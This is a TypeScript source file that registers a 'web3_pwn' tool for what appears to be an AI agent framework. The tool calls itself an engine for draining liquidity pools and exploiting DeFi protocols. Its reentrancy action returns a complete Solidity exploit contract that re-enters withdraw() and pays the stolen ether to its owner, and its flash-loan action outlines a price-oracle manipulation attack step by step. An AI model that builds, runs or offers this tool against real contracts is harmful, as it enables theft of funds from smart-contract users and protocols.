export * as Web3PwnTool from "./web3-pwn"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "web3_pwn"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'reentrancy' (Generate exploit contract for Reentrancy), 'flash_loan' (Generate Flash Loan price oracle manipulation attack), 'signature_malleability' (Exploit ECDSA signature malleability), 'honeypot_detect' (Analyze contract for honeypot traps).",
  }),
  target_contract: Schema.String.pipe(Schema.optional).annotate({
    description: "Address of the target vulnerable smart contract.",
  }),
  blockchain: Schema.String.pipe(Schema.optional).annotate({
    description: "Target chain (e.g., 'ethereum', 'bsc', 'arbitrum').",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exploit_solidity: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Web3 and Smart Contract Exploitation Engine. Capabilities: Solidity vulnerability analysis and exploitation. Automatically generates exploit contracts for Reentrancy attacks, Flash Loan (Price Oracle) manipulation, Integer Overflows/Underflows, and Signature Malleability (ecrecover). Used to drain liquidity pools and exploit DeFi protocols.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let exploitCode = ""
              let outputText = ""

              if (action === "reentrancy") {
                outputText = `# Smart Contract Reentrancy Exploitation\n\nTarget: ${input.target_contract || "0xVulnerableContract"}\nImpact: Draining ether/tokens by re-entering the \`withdraw()\` function before the victim contract updates its internal state.`
                exploitCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableStore {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentrancyExploit {
    IVulnerableStore public target;
    address public owner;

    constructor(address _target) {
        target = IVulnerableStore(_target);
        owner = msg.sender;
    }

    // 1. Initiate the attack by depositing and immediately withdrawing
    function attack() external payable {
        require(msg.value >= 1 ether, "Require 1 Ether to attack");
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    // 2. The fallback function that gets called when target sends Ether
    // This triggers the reentrancy loop before target updates our balance
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }

    // 3. Extract the stolen funds to our wallet
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
`
              } else if (action === "flash_loan") {
                outputText = `# Flash Loan / Price Oracle Manipulation Attack\n\nImpact: Borrowing massive liquidity instantly to skew an Automated Market Maker (AMM) price oracle, exploiting the skewed price, and repaying the loan in a single transaction.`
                exploitCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Pseudo-code representation of a Flash Loan attack structure
contract FlashLoanExploit {
    
    function executeAttack() external {
        // 1. Borrow $100M USDC via Aave Flash Loan
        // aavePool.flashLoan(address(this), usdcAddress, 100_000_000 * 10**6, "");
    }

    // Callback executed by Aave after granting the loan
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // 2. Dump $100M USDC into a low-liquidity target DEX pool (e.g., TargetCoin/USDC)
        // This artificially crashes the price of TargetCoin in that specific pool.
        
        // 3. The Vulnerable Protocol relies on this DEX pool's spot price as an Oracle.
        // It now believes TargetCoin is practically worthless.
        
        // 4. Liquidate undercollateralized positions on the Vulnerable Protocol
        // OR buy assets from the Vulnerable Protocol at the artificially crashed price.
        
        // 5. Swap back on another DEX to regain USDC.
        
        // 6. Repay the $100M Aave flash loan + 0.09% fee.
        
        // 7. Keep the massive arbitrage profit.
        return true;
    }
}
`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, exploit_solidity: exploitCode }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Web3 Pwn failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/web3-pwn",
  layer,
  deps: [ToolRegistry.node],
})
